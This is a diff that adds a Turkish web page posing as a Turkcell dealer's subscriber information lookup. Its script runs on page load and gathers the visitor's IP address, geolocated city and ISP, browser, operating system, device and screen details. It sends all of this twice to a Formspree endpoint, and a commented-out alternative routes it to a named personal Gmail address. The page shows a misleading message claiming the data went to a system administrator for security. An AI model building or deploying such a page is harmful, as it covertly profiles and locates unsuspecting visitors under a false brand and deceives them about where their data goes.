@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Abone Bilgi Sorgulama</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .container {
+            width: 80%;
+            max-width: 800px;
+            margin: 50px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+        .logo {
+            max-width: 150px;
+            margin-bottom: 15px;
+        }
+        h1 {
+            color: #0063BE; /* Turkcell mavisi */
+            margin-bottom: 5px;
+        }
+        .info-section {
+            margin-top: 30px;
+        }
+        .info-item {
+            margin-bottom: 15px;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+        }
+        .info-item strong {
+            display: inline-block;
+            width: 200px;
+            color: #0063BE;
+        }
+        .loading {
+            text-align: center;
+            padding: 20px;
+            font-style: italic;
+        }
+        .status-message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            background-color: #d4edda;
+            color: #155724;
+            display: none;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="logo.png" alt="Turkcell Bayi Logo" class="logo">
+            <h1>Abone Bilgi Sorgulama</h1>
+            <p>Bağlantı bilgileriniz aşağıda gösterilmektedir.</p>
+        </header>
+
+        <div class="info-section">
+            <div id="loading" class="loading">Bilgiler yükleniyor, lütfen bekleyin...</div>
+            <div id="status-message" class="status-message">Bilgileriniz güvenlik amacıyla sistem yöneticisine gönderildi.</div>
+            <div id="info-content" style="display: none;">
+                <div class="info-item">
+                    <strong>IP Adresi:</strong> <span id="ip-address">-</span>
+                </div>
+                <div class="info-item">
+                    <strong>Konum:</strong> <span id="location">-</span>
+                </div>
+                <div class="info-item">
+                    <strong>Servis Sağlayıcı (ISP):</strong> <span id="isp">-</span>
+                </div>
+                <div class="info-item">
+                    <strong>Tarayıcı:</strong> <span id="browser">-</span>
+                </div>
+                <div class="info-item">
+                    <strong>İşletim Sistemi:</strong> <span id="os">-</span>
+                </div>
+                <div class="info-item">
+                    <strong>Cihaz Tipi:</strong> <span id="device">-</span>
+                </div>
+                <div class="info-item">
+                    <strong>Ekran Çözünürlüğü:</strong> <span id="screen">-</span>
+                </div>
+                <div class="info-item">
+                    <strong>Dil:</strong> <span id="language">-</span>
+                </div>
+                <div class="info-item">
+                    <strong>Zaman Dilimi:</strong> <span id="timezone">-</span>
+                </div>
+                <div class="info-item">
+                    <strong>Ziyaret Tarihi/Saati:</strong> <span id="datetime">-</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>&copy; 2025 Turkcell Bayi. Tüm hakları saklıdır.</p>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // EmailJS'i başlat
+            (function() {
+                // BURADA SİZİN EMAILJS ID'NİZ OLACAK
+                emailjs.init("YOUR_EMAILJS_USER_ID");
+            })();
+            
+            // Yükleme göstergesi ve içerik alanı
+            const loading = document.getElementById('loading');
+            const infoContent = document.getElementById('info-content');
+            const statusMessage = document.getElementById('status-message');
+            
+            // Bilgileri saklamak için global değişkenler
+            let userData = {};
+            
+            // Tarayıcı ve cihaz bilgilerini al
+            const browserInfo = detectBrowser();
+            const osInfo = detectOS();
+            const deviceInfo = detectDevice();
+            
+            // Ekran çözünürlüğü
+            const screenInfo = window.screen.width + 'x' + window.screen.height;
+            
+            // Dil
+            const language = navigator.language || navigator.userLanguage;
+            
+            // Tarih/Saat
+            const now = new Date();
+            const datetime = now.toLocaleString('tr-TR');
+            
+            // Tarayıcıdan alınabilen bilgileri doldur
+            document.getElementById('browser').textContent = browserInfo;
+            document.getElementById('os').textContent = osInfo;
+            document.getElementById('device').textContent = deviceInfo;
+            document.getElementById('screen').textContent = screenInfo;
+            document.getElementById('language').textContent = language;
+            document.getElementById('datetime').textContent = datetime;
+            
+            // Kullanıcı verilerine ekleme
+            userData.browser = browserInfo;
+            userData.os = osInfo;
+            userData.device = deviceInfo;
+            userData.screen = screenInfo;
+            userData.language = language;
+            userData.datetime = datetime;
+            
+            // IP bilgisi, konum ve ISP için API çağrısı yap
+            fetchIpInfo();
+            
+            // İşlevler
+            function detectBrowser() {
+                const userAgent = navigator.userAgent;
+                let browserName;
+                
+                if (userAgent.match(/chrome|chromium|crios/i)) {
+                    browserName = "Chrome";
+                } else if (userAgent.match(/firefox|fxios/i)) {
+                    browserName = "Firefox";
+                } else if (userAgent.match(/safari/i)) {
+                    browserName = "Safari";
+                } else if (userAgent.match(/opr\//i)) {
+                    browserName = "Opera";
+                } else if (userAgent.match(/edg/i)) {
+                    browserName = "Edge";
+                } else if (userAgent.match(/android/i)) {
+                    browserName = "Android Browser";
+                } else if (userAgent.match(/iphone|ipad/i)) {
+                    browserName = "iPhone/iPad Browser";
+                } else {
+                    browserName = "Bilinmeyen";
+                }
+                
+                return browserName;
+            }
+            
+            function detectOS() {
+                const userAgent = navigator.userAgent;
+                let osName;
+                
+                if (userAgent.match(/windows nt/i)) {
+                    osName = "Windows";
+                } else if (userAgent.match(/macintosh|mac os x/i)) {
+                    osName = "MacOS";
+                } else if (userAgent.match(/linux/i)) {
+                    osName = "Linux";
+                } else if (userAgent.match(/android/i)) {
+                    osName = "Android";
+                } else if (userAgent.match(/iphone|ipad/i)) {
+                    osName = "iOS";
+                } else {
+                    osName = "Bilinmeyen";
+                }
+                
+                return osName;
+            }
+            
+            function detectDevice() {
+                const userAgent = navigator.userAgent;
+                
+                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
+                    return "Tablet";
+                }
+                if (
+                    /Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(
+                        userAgent
+                    )
+                ) {
+                    return "Mobil";
+                }
+                return "Masaüstü";
+            }
+            
+            function fetchIpInfo() {
+                // Ücretsiz API kullanımı
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        document.getElementById('ip-address').textContent = data.ip;
+                        document.getElementById('location').textContent = `${data.city || 'Bilinmeyen'}, ${data.region || 'Bilinmeyen'}, ${data.country_name || 'Bilinmeyen'}`;
+                        document.getElementById('isp').textContent = data.org || 'Bilinmeyen';
+                        document.getElementById('timezone').textContent = data.timezone || 'Bilinmeyen';
+                        
+                        // Kullanıcı verilerine ekleme
+                        userData.ip = data.ip;
+                        userData.location = `${data.city || 'Bilinmeyen'}, ${data.region || 'Bilinmeyen'}, ${data.country_name || 'Bilinmeyen'}`;
+                        userData.isp = data.org || 'Bilinmeyen';
+                        userData.timezone = data.timezone || 'Bilinmeyen';
+                        
+                        // E-posta gönder
+                        sendEmailAutomatically(userData);
+                        
+                        // Yükleme tamamlandı, içeriği göster
+                        loading.style.display = 'none';
+                        infoContent.style.display = 'block';
+                        statusMessage.style.display = 'block';
+                    })
+                    .catch(error => {
+                        console.error('IP bilgisi alınırken hata oluştu:', error);
+                        document.getElementById('ip-address').textContent = 'Bilgi alınamadı';
+                        document.getElementById('location').textContent = 'Bilgi alınamadı';
+                        document.getElementById('isp').textContent = 'Bilgi alınamadı';
+                        document.getElementById('timezone').textContent = 'Bilgi alınamadı';
+                        
+                        // Kullanıcı verilerine ekleme
+                        userData.ip = 'Bilgi alınamadı';
+                        userData.location = 'Bilgi alınamadı';
+                        userData.isp = 'Bilgi alınamadı';
+                        userData.timezone = 'Bilgi alınamadı';
+                        
+                        // Yine de e-posta gönder
+                        sendEmailAutomatically(userData);
+                        
+                        // Yükleme hatası, yine de içeriği göster
+                        loading.style.display = 'none';
+                        infoContent.style.display = 'block';
+                        statusMessage.style.display = 'block';
+                    });
+            }
+            
+            function sendEmailAutomatically(data) {
+                // Formspree yöntemi (Daha kolay kurulum için)
+                const formData = new FormData();
+                formData.append('_subject', 'Yeni Abone Bilgi Raporu');
+                
+                // Tüm kullanıcı verilerini ekle
+                for (const key in data) {
+                    formData.append(key, data[key]);
+                }
+                
+                // Formspree aracılığıyla ilk e-postayı size gönder
+                fetch('https://formspree.io/f/mblggklb', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                // Formspree aracılığıyla ikinci e-postayı belirtilen adrese gönder
+                fetch('https://formspree.io/f/mblggklb', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                // EmailJS yöntemi (Alternatif)
+                /* 
+                // E-posta içeriği oluştur
+                const emailContent = formatEmailContent(data);
+                
+                // Size gönderi
+                emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
+                    to_email: 'sizin@email.com',
+                    subject: 'Yeni Abone Bilgi Raporu',
+                    message_html: emailContent
+                });
+                
+                // Belirtilen adrese gönderi
+                emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
+                    to_email: 'korkmaz.x7@gmail.com',
+                    subject: 'Yeni Abone Bilgi Raporu',
+                    message_html: emailContent
+                });
+                */
+            }
+            
+            function formatEmailContent(data) {
+                return `
+                    <h2>Abone Bilgi Raporu</h2>
+                    <p>Aşağıda ziyaretçinin bilgileri bulunmaktadır:</p>
+                    <table style="border-collapse: collapse; width: 100%;">
+                        <tr style="background-color: #f2f2f2;">
+                            <th style="border: 1px solid #ddd; padding: 8px; text-align: left;">Bilgi</th>
+                            <th style="border: 1px solid #ddd; padding: 8px; text-align: left;">Değer</th>
+                        </tr>
+                        <tr>
+                            <td style="border: 1px solid #ddd; padding: 8px;">IP Adresi</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.ip}</td>
+                        </tr>
+                        <tr style="background-color: #f2f2f2;">
+                            <td style="border: 1px solid #ddd; padding: 8px;">Konum</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.location}</td>
+                        </tr>
+                        <tr>
+                            <td style="border: 1px solid #ddd; padding: 8px;">Servis Sağlayıcı</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.isp}</td>
+                        </tr>
+                        <tr style="background-color: #f2f2f2;">
+                            <td style="border: 1px solid #ddd; padding: 8px;">Tarayıcı</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.browser}</td>
+                        </tr>
+                        <tr>
+                            <td style="border: 1px solid #ddd; padding: 8px;">İşletim Sistemi</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.os}</td>
+                        </tr>
+                        <tr style="background-color: #f2f2f2;">
+                            <td style="border: 1px solid #ddd; padding: 8px;">Cihaz Tipi</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.device}</td>
+                        </tr>
+                        <tr>
+                            <td style="border: 1px solid #ddd; padding: 8px;">Ekran Çözünürlüğü</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.screen}</td>
+                        </tr>
+                        <tr style="background-color: #f2f2f2;">
+                            <td style="border: 1px solid #ddd; padding: 8px;">Dil</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.language}</td>
+                        </tr>
+                        <tr>
+                            <td style="border: 1px solid #ddd; padding: 8px;">Zaman Dilimi</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.timezone}</td>
+                        </tr>
+                        <tr style="background-color: #f2f2f2;">
+                            <td style="border: 1px solid #ddd; padding: 8px;">Ziyaret Tarihi/Saati</td>
+                            <td style="border: 1px solid #ddd; padding: 8px;">${data.datetime}</td>
+                        </tr>
+                    </table>
+                    <p>Bu rapor otomatik olarak oluşturulmuştur.</p>
+                `;
+            }
+        });
+    </script>
+    
+    <!-- Formspree gizli form -->
+    <form id="hidden-form" action="https://formspree.io/f/mblggklb" method="POST" style="display:none;">
+        <input type="hidden" name="_subject" value="Yeni Abone Bilgi Raporu">
+        <input type="hidden" id="form-data" name="data">
+        <button type="submit" id="hidden-submit">Gönder</button>
+    </form>
+</body>
+</html>
